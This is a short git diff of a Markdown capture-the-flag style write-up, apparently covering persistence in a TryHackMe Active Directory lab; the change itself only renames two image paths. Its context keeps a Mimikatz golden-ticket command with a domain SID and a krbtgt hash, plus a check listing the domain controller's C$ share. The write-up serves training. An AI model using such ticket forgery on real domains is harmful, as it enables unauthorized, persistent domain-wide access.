@@ -111,7 +111,7 @@ Parameters explained:
 kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
 ```
 
-<figure><img src="../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (116) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can verify that the golden ticket is working by running the dir command against the domain controller.
 
@@ -351,7 +351,7 @@ dir \\thmdc.za.tryhackme.loc\c$
 
 <figure><img src="../../.gitbook/assets/image (16) (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (117) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (117) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Persistence through Group Membership
 
